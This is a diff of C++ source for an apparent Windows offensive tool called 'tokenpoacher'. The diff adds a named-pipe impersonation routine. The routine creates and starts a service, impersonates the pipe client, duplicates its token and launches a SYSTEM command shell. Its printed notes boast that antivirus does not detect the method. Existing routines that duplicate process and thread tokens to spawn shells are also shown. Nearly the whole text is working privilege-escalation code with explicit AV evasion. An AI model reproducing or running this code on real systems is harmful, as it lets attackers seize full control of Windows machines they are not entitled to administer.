@@ -1,4 +1,4 @@
-
+#define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <Windows.h>
 #include <string>
@@ -106,6 +106,150 @@ void setProcessPrivs(LPCWSTR privname)
     //cin.get();
 }
 
+void NamedPipeImpersonate()
+{
+    printf("==============================================================================\n");
+    printf("Before we continue setting up the pipe server to receive the client, make sure to place the named pipe client executable in the c:\\users\\public directory\n");
+    printf("If not, this will not work unless you already manually created a service to connect to the named pipe server.\n");
+    printf("The client is in my github repo, called warpzoneclient.exe (shoutouts to super mario bros.)  Just compile it or download the release binary\n\n");
+    printf("Why do all this prep work?  Because AV detects echo commands and several other common methods for the client to connect.  AV doesn't detect this method...yet\n");
+    printf("If you're ready to go, hit enter and enjoy your SYSTEM shell...if you're not ready, just do control+c and do preparations first ;)\n");
+    printf("==============================================================================\n");
+    cin.get();
+    setProcessPrivs(SE_IMPERSONATE_NAME);
+
+    if (HINSTANCE retVal = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", NULL, SW_HIDE))
+    {
+        printf("[+] Successfully created the service!!!\n");
+    }
+    else
+    {
+        printf("[!] There was an error creating the service: %d\n", GetLastError());
+    }
+ 
+    LPCWSTR pipeName = L"\\\\.\\pipe\\warpzone8";
+    LPVOID pipeBuffer = NULL;
+    HANDLE serverPipe;
+    DWORD readBytes = 0;
+    DWORD readBuffer = 0;
+    int err = 0;
+    BOOL isPipeConnected;
+    wchar_t message[] = L"Greetings plumber!";
+    DWORD messageLenght = lstrlen(message) * 2;
+    DWORD bytesWritten = 0;
+
+    std::wcout << "Creating named pipe " << pipeName << std::endl;
+    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
+
+    if (HINSTANCE retVal2 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc start plumber", NULL, SW_HIDE))
+    {
+        printf("[+] Successfully created the service!!!\n");
+    }
+    else
+    {
+        printf("[!] There was an error creating the service: %d\n", GetLastError());
+    }
+
+    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+    if (isPipeConnected) {
+        std::wcout << "Incoming connection to " << pipeName << std::endl;
+    }
+
+    std::wcout << "Sending message: " << message << std::endl;
+    WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
+
+
+    std::wcout << "Impersonating the client..." << std::endl;
+    if (ImpersonateNamedPipeClient(serverPipe))
+    {
+        printf("[+] Successfully Impersonated the client!!\n");
+    }
+    else
+    {
+        printf("error: %i\n", GetLastError());
+    }
+
+    wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";
+
+    BOOL bResult = FALSE;
+    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
+    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
+
+    DWORD dwCreationFlags = 0;
+    LPWSTR pwszCurrentDirectory = NULL;
+    LPVOID lpEnvironment = NULL;
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFO si = { 0 };
+
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
+    {
+        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
+    {
+        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+
+    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
+
+
+    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
+        goto cleanup;
+
+    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
+    {
+        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
+    {
+        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+        goto cleanup;
+    }
+
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(STARTUPINFO);
+    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
+
+    if (CreateProcessAsUser(hSystemTokenDup, NULL, command, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
+    {
+        printf("[+] successfully created a SYSTEM shell!!!\n");
+    }
+    else
+    {
+        printf("[!] There was an error creating the SYSTEM shell using CreateProcessAsUser: %d\n", GetLastError());
+    }
+    fflush(stdout);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+cleanup:
+    if (hSystemToken)
+        CloseHandle(hSystemToken);
+    if (hSystemTokenDup)
+        CloseHandle(hSystemTokenDup);
+    if (pwszCurrentDirectory)
+        free(pwszCurrentDirectory);
+    if (lpEnvironment)
+        DestroyEnvironmentBlock(lpEnvironment);
+    if (pi.hProcess)
+        CloseHandle(pi.hProcess);
+    if (pi.hThread)
+        CloseHandle(pi.hThread);
+    if (HINSTANCE retVal3 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc delete plumber", NULL, SW_HIDE))
+    {
+        printf("[+] Successfully deleted the service!!!\n");
+    }
+    else
+    {
+        printf("[!] There was an error deleting the service: %d\n", GetLastError());
+    }
+}
+
+
 bool MyCreateFileFunc()
 {
     cout << "attempting to create a file in a directory we don't have access to...\n";
@@ -161,7 +305,7 @@ int CheckProcessIntegrity(DWORD pid)
     hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (!hProc)
     {
-        printf("there was a permissions error opening the process w/ all access...: %d\n", GetLastError());
+        printf("[!] There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
     }
     std::string procname;
     DWORD buffSize = 1024;
@@ -176,7 +320,7 @@ int CheckProcessIntegrity(DWORD pid)
     HANDLE hTok;
     if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok))
     {
-        printf("there was an a permissions error applying all access to the token: %d\n", GetLastError());
+        printf("[!] There was an a permissions error applying all access to the token: %d\n", GetLastError());
     }
     DWORD lengthneeded;
     DWORD dwIntegrityLevel;
@@ -271,11 +415,11 @@ int LowerProcessIntegrity(DWORD pid, int integritylevel)
     hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc)
     {
-        printf("There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
+        printf("[!] There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
     }
     if (!OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken))
     {
-        printf("There was a permissions error applying all access to the token: %d\n", GetLastError());
+        printf("[!] There was a permissions error applying all access to the token: %d\n", GetLastError());
     }
     if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
     {
@@ -293,16 +437,16 @@ int LowerProcessIntegrity(DWORD pid, int integritylevel)
 
                 if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
                 {
-                    wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
+                    wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
                 }
                 if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
                 {
-                    wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+                    wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
                 }
 
                 if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
                 {
-                    wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+                    wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
                 }
                 // Create the new process at Low integrity trying both methods
                 ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
@@ -380,41 +524,41 @@ int DupThreadToken(DWORD pid)
     remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
     if (remoteproc)
     {
-        wprintf(L"Opened remote process!\n");
+        wprintf(L"[+] Opened remote process!\n");
     }
     else
     {
-        wprintf(L"OpenProcess(). Error: %d\n", GetLastError());
+        wprintf(L"[!] OpenProcess(). Error: %d\n", GetLastError());
     }
     if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2))
     {
-        wprintf(L"OpenProcessToken(). Error: %d\n", GetLastError());
+        wprintf(L"[!] OpenProcessToken(). Error: %d\n", GetLastError());
     }
 
 
     if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
     {
-        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
     }
     if (SetThreadToken(NULL, hNewToken))
     {
-        printf("[!] set the thread token!\n");
+        printf("[+] Successfully set the thread token!\n");
     }
 
 
     setThreadPrivs(SE_INCREASE_QUOTA_NAME);     //need this for CreateProcessAsUser!
     setThreadPrivs(SE_ASSIGNPRIMARYTOKEN_NAME); //need this for CreateProcessAsUser!
 
-    printf("thread privs set!\n");
+    printf("[+] Thread privs set!\n");
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
     {
-        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
+        wprintf(L"[!] OpenThreadToken(). Error: %d\n", GetLastError());
     }
 
     if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
     {
-        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] DuplicateTokenEx() failed. Error: %d\n", GetLastError());
     }
 
 
@@ -422,16 +566,16 @@ int DupThreadToken(DWORD pid)
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
     {
-        wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
     }
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
-        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
     {
-        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
     }
     ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
     StartupInfo.cb = sizeof(STARTUPINFO);
@@ -511,13 +655,13 @@ int DupProcessToken(DWORD pid)
     proc2 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (!proc2)
     {
-        printf("There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
+        printf("[!] There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
         exit(0);
     }
 
     if (!OpenProcessToken(proc2, MAXIMUM_ALLOWED, &tok2))
     {
-        printf("There was a permissions error applying the requested access to the token: %d\n", GetLastError());
+        printf("[!] There was a permissions error applying the requested access to the token: %d\n", GetLastError());
         exit(0);
     }
     // TCHAR name[UNLEN + 1];
@@ -565,16 +709,16 @@ int DupProcessToken(DWORD pid)
 
     if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
     {
-        wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
     }
     if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
     {
-        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] GetSystemDirectory() failed. Error: %d\n", GetLastError());
     }
 
     if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
     {
-        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
+        wprintf(L"[!] CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
     }
     ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
     StartupInfo.cb = sizeof(STARTUPINFO);
@@ -625,12 +769,13 @@ int main(int argc, char* argv[])
 {
     //printf("argc: %d", argc);
     DWORD pid;
-    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0)
+    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0 && strcmp(argv[1], "-np") != 0)
     {
-        printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
+        printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
         printf("usage: tokenpoacher.exe -p 1234 -cpi\n");
         printf("usage: tokenpoacher.exe -p 1234 -d\n");
         printf("usage: tokenpoacher.exe -p 1234 -dt\n");
+        printf("usage: tokenpoacher.exe -np\n");
         printf("usage: tokenpoacher.exe -lcp\n");
         printf("usage: tokenpoacher.exe -p 1234 -l\n");
 
@@ -662,6 +807,12 @@ int main(int argc, char* argv[])
         LowerProcessIntegrity(GetCurrentProcessId(), level);
         exit(0);
     }
+    if (strcmp(argv[1], "-np") == 0)
+    {
+        NamedPipeImpersonate();
+        exit(0);
+        
+    }
 
     if (strcmp(argv[1], "-p") == 0)
     {
@@ -679,6 +830,7 @@ int main(int argc, char* argv[])
             DupThreadToken(pid);
             exit(0);
         }
+        
 
     }
     if (strcmp(argv[1], "-p") == 0)
@@ -692,7 +844,7 @@ int main(int argc, char* argv[])
 
     }
 
-    printf("hmm...I don't understand that parameter option");
+    printf("[!] hmm...I don't understand that parameter option\n");
 
 }
 
